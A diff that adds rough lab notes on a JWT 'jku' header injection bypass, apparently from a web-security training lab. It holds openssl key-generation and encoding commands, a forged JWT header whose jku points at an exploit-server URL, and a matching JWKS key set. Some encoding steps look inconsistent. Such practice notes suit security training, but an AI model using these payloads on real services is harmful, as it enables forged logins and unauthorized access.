@@ -33,3 +33,59 @@ F505196ACFEEC722255457341E9F546F19F3D1640E60772A98BB89484DAA12E597F732268AE4AA90
 }
 
 
+
+
+
+
+
+
+
+
+#jku  security bypass 
+
+openssl genpkey -algorithm RSA -out private_key.pem -pkeyopt rsa_keygen_bits:2048 # generate private 
+openssl rsa -in private_key.pem -pubout -out public_key.pem #generate public key 
+
+# how to encoding performed here 
+
+echo 010001 | xxd -r -ps | base64 # identification 
+
+# modules 
+
+openssl rsa -text -noout -in private_key.pem -modulus
+
+# encode with based 64 
+
+echo B6CDF7CFC476F4B9479BAB42D977A6E0D9113244AD6890719FBBDA9475BE38F6085BDABF9FB8CE4FCBCFADAED79B49DF9ECBA1F8B0925D60B9575704933FAA074E68
+FBF1C4A206B26BED24685B113E40640FDF4B6F457A4C9425157DD3E30DAE180D2A7D1D0DF77D9E82799A53E7B3FBDE14FB53B69FEF2B5AFDB17C44849E6586CBF5C02E82DFBAF2F4
+F505196ACFEEC722255457341E9F546F19F3D1640E60772A98BB89484DAA12E597F732268AE4AA90E48AEEDACD9DC624C77F5400E76F712D31DC3FE009621050618462B3CE56E97A
+32F844A0EBFFACC2B61EE1AB98B730128C2BEF588F8B29878431CE7CEB426EAC7C5FB2D57FDBB89C64D6D62A9F0B | xxd -r -ps | base64 -w 0
+
+
+
+# jku header  
+
+
+{
+  "alg": "RS256",
+  "typ": "JWT",
+  "kid": "25eded90-d69a-4100-aa73-421e86b7bf25",
+  "jku": "https://exploit-0ab0009603a58a2a80893e1b0150006b.exploit-server.net/exploit"
+}
+
+
+# and key pattern 
+
+{
+    "keys": [
+        {
+            "kid": "25eded90-d69a-4100-aa73-421e86b7bf25",
+            "kty": "RSA",
+            "e": "AQAB",
+            "n": "2JqzzIBDxb23BYNWdcdF4TfjUFCxMDrVcpYAVG47QfQbGKzonN21Tsg6ecU8yhRSdL5WKR8wcRrmqZMnDDoMkFh7g/GfN+Og70+M7HbSNbdA/kau1ed3eHI71zrKUIP4ObYcLQ0xOGYtgAkUs5KEk1GRTp0uydpCeil26SI/o0iTylVD8hR+nLfKYreQE8oyjq18O3bn0x+LS4/jY0rQDnMaqUTp3KEu0BH7MSF+iGVEwe/bYkgEcKov9V/MAmBYdLEtzw14/FCACu8o/bMXyvGlOIDrBRkVJqJyKn5fF2W4+FFszH0jbOOCBpZy5EuClG3R+/KQGXSN8H2KuQ72xw=="
+        }
+    ]
+}
+
+
+
